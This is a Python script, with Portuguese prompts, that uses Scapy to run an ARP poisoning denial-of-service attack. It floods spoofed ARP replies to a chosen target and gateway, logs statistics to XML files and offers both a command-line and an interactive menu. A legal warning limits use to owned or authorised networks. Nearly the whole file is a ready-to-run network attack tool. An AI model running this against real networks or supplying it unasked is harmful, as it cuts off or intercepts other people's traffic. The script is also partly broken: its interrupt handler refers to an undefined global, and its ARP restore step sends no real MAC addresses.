#!/usr/bin/env python3
# ARP Poison Attack (Denial of Service - DoS)

import threading
import time
import os
import signal
import sys
import argparse
from datetime import datetime
from scapy.all import ARP, send

# Global flag for graceful termination
running = True

def dict_to_xml(tag, d):
    """Converte um dicionário em uma string XML simples."""
    parts = [f"<{tag}>"]
    for key, value in d.items():
        if isinstance(value, dict):
            parts.append(dict_to_xml(key, value))
        else:
            parts.append(f"<{key}>{value}</{key}>")
    parts.append(f"</{tag}>")
    return ''.join(parts)

class AdvancedNetworkTester:
    def __init__(self, target_ip, gateway_ip, duration):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.attack_duration = duration

        self.running = False
        self.start_time = None

        self.log_dir = "/var/log/network_tests"
        os.makedirs(self.log_dir, exist_ok=True)
        # Log file in XML format
        self.log_file = os.path.join(self.log_dir, f"arp_poison_{datetime.now().strftime('%Y%m%d_%H%M%S')}.xml")

        self.stats = {
            'arp_packets_sent': 0,
            'errors': 0,
            'start_time': None,
            'end_time': None
        }

    def _log_event(self, event_type, message):
        log_entry = {
            'timestamp': datetime.now().isoformat(),
            'type': event_type,
            'message': message,
            'stats': self.stats.copy()
        }
        try:
            with open(self.log_file, 'a') as f:
                xml_entry = dict_to_xml('log', log_entry)
                f.write(xml_entry + '\n')
        except Exception as e:
            print(f"[LOG ERROR] {str(e)}")

    def arp_poison(self):
        self._log_event('ARP_START', 'Iniciando envenenamento ARP')
        while self.running:
            try:
                # Poison target's ARP cache: Tell target that gateway is at attacker's MAC.
                send(ARP(op=2, pdst=self.target_ip, psrc=self.gateway_ip), verbose=0)
                # Poison gateway's ARP cache: Tell gateway that target is at attacker's MAC.
                send(ARP(op=2, pdst=self.gateway_ip, psrc=self.target_ip), verbose=0)
                self.stats['arp_packets_sent'] += 2
                time.sleep(0.01)
            except Exception as e:
                self.stats['errors'] += 1
                self._log_event('ARP_ERROR', str(e))
                time.sleep(1)

    def restore_network(self):
        self._log_event('RESTORE', 'Restaurando tabelas ARP')
        try:
            send(ARP(op=2, pdst=self.gateway_ip, psrc=self.target_ip, hwdst="ff:ff:ff:ff:ff:ff"), count=3, verbose=0)
            send(ARP(op=2, pdst=self.target_ip, psrc=self.gateway_ip, hwdst="ff:ff:ff:ff:ff:ff"), count=3, verbose=0)
        except Exception as e:
            self._log_event('RESTORE_ERROR', str(e))

    def start(self):
        if os.getuid() != 0:
            print("❌ Este script requer privilégios de root (sudo)")
            return

        self.running = True
        self.stats['start_time'] = datetime.now().isoformat()
        self.start_time = time.time()

        print(f"\n🔧 Configuração do Teste:")
        print(f"   • Alvo: {self.target_ip}")
        print(f"   • Gateway: {self.gateway_ip}")
        print(f"   • Duração: {self.attack_duration}s")
        print(f"   • Log File: {self.log_file}\n")

        threading.Thread(target=self.arp_poison, daemon=True).start()

        try:
            while self.running and (time.time() - self.start_time < self.attack_duration):
                elapsed = time.time() - self.start_time
                print(
                    f"\r⏱ {elapsed:.1f}s/{self.attack_duration}s | "
                    f"ARP: {self.stats['arp_packets_sent']} | "
                    f"Erros: {self.stats['errors']}",
                    end='', flush=True
                )
                time.sleep(0.5)
        except KeyboardInterrupt:
            print("\n🛑 Interrompido pelo usuário!")
        self.stop()

    def stop(self):
        self.running = False
        self.stats['end_time'] = datetime.now().isoformat()

        self.restore_network()
        self._log_event('TEST_END', 'Teste concluído')

        duration = time.time() - self.start_time
        print("\n\n📊 Relatório Final:")
        print(f"   • Duração real: {duration:.1f}s")
        print(f"   • Pacotes ARP enviados: {self.stats['arp_packets_sent']}")
        print(f"   • Erros registrados: {self.stats['errors']}")
        print(f"   • Log completo em: {self.log_file}\n")

def signal_handler(sig, frame):
    global tester
    print("\n🛑 Recebido sinal de interrupção!")
    tester.stop()
    sys.exit(0)

def menu():
    print("\n⚠️ AVISO LEGAL: Use este script apenas em redes próprias ou com autorização explícita!\n")
    target = input("Digite o endereço IP do alvo: ").strip()
    gateway = input("Digite o endereço IP do gateway: ").strip()
    duration = int(input("Digite a duração do teste em segundos [30]: ") or "30")

    tester = AdvancedNetworkTester(target, gateway, duration)
    tester.start()

def terminal():
    parser = argparse.ArgumentParser(description="ARP Poison Attack Tool")
    parser.add_argument("-t", "--target", required=True, help="IP do alvo")
    parser.add_argument("-g", "--gateway", required=True, help="IP do gateway")
    parser.add_argument("-d", "--duration", type=int, default=30, help="Duração do teste em segundos (default: 30)")

    args = parser.parse_args()

    tester = AdvancedNetworkTester(args.target, args.gateway, args.duration)
    tester.start()

def main():
    signal.signal(signal.SIGINT, signal_handler)
    if len(sys.argv) > 1:
        terminal()
    else:
        menu()

if __name__ == "__main__":
    main()
